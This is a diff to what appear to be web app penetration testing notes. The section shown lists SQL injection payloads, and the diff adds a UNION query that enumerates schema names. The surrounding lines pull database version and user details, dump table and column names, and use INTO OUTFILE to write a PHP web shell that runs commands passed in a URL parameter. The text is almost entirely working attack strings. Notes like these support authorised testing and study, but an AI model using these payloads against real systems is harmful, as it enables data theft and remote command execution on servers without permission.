@@ -151,6 +151,7 @@ Web App Pentest
         ' UNION SELECT null, null, database(), user(), @@version  -- //
         ' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
       shell with Union
+        ' UNION SELECT NULL,NULL,NULL,group_concat(schema_name),NULL,NULL from information_schema.schemata-- - (for database names)
         ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
 
   Time Based Blind SQL:
